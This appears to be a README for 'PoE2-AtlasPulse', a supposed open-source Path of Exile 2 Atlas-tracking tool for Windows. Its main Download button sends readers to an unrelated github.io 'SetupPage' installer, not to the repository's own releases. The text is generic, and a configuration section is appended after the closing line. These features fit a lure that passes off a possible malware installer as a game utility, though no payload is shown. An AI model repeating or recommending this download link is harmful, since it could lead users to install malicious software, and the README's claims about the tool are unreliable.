# PoE2‑AtlasPulse
*Your real‑time Atlas companion for Path of Exile 2 – Windows 10/11 only*

---

## 📌 What is AtlasPulse?

AtlasPulse is a lightweight desktop utility that watches your Atlas progression in **Path of Exile 2** and paints it onto an interactive map.

- **Instant visual feedback** – see which zones you’ve cleared and what’s left.
- **Live updates** – the map refreshes automatically as you finish a map.
- **Windows‑only** – built and tested exclusively for Windows 10 and Windows 11.

> **Note:** AtlasPulse does not modify the game files; it only reads the public progress data that the game already exposes.

---

## 🚀 Quick Start

| Action | Button |
|--------|--------|
| Download the latest release | <a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download"></a> |
| View the documentation | <a href="https://github.com/MidnightPilotPonder/PoE2-AtlasPulse/wiki" target="_blank"><img src="https://img.shields.io/badge/Docs-Wiki-lightgrey?style=for-the-badge&logo=github" alt="Docs"></a> |
| Report an issue | <a href="https://github.com/MidnightPilotPonder/PoE2-AtlasPulse/issues" target="_blank"><img src="https://img.shields.io/badge/Issues-Open%20Now-red?style=for-the-badge&logo=github" alt="Issues"></a> |

1. Click **Download** and follow the on‑screen wizard.
2. Launch AtlasPulse; it will detect a running PoE2 client automatically.
3. Watch the Atlas map fill in as you clear new zones.

---

## 🛠️ Features at a Glance

| ✅ Feature | Description |
|---|---|
| **Live Atlas heatmap** | Colors indicate cleared, pending, and boss zones. |
| **Progress statistics** | Percent completed, remaining maps, and estimated time to finish. |
| **Custom filters** | Hide/show specific tiers, difficulty levels, or quest‑related nodes. |
| **Lightweight UI** | Minimal RAM/CPU impact; runs silently in the system tray. |
| **Export & share** | Save a PNG snapshot of your current Atlas state. |
| **Open‑source** | Fully transparent code, contributions welcome. |

---

## 🖥️ System Requirements

| Requirement | Minimum |
|-------------|---------|
| OS | Windows 10 (1809) or Windows 11 |
| .NET Runtime | .NET 6.0 (bundled with the installer) |
| CPU | Any modern x86‑64 processor |
| RAM | < 100 MB while running |
| Disk | < 20 MB installation size |

---

## 📂 Repository Layout

```
PoE2-AtlasPulse/
├─ src/                # C# source code
├─ assets/             # Icons and UI assets
├─ docs/               # Additional guides & design docs
├─ tests/              # Unit & integration tests
└─ README.md           # You’re here!
```

---

## 🤝 Contributing

We love community help! If you’d like to improve AtlasPulse:

1. Fork the repo.
2. Create a feature branch (`git checkout -b feature/awesome‑thing`).
3. Ensure all existing tests pass (`dotnet test`).
4. Open a Pull Request with a clear description of your changes.

Please follow the **code of conduct** in `docs/CODE_OF_CONDUCT.md`.

---

## 📜 License

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---

## 🙏 Acknowledgements

- **Path of Exile 2** – the game that inspires us.
- The **.NET** community for the robust runtime.
- All contributors who have helped shape AtlasPulse.

---

*Happy mapping, and may your Atlas always pulse with progress!*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```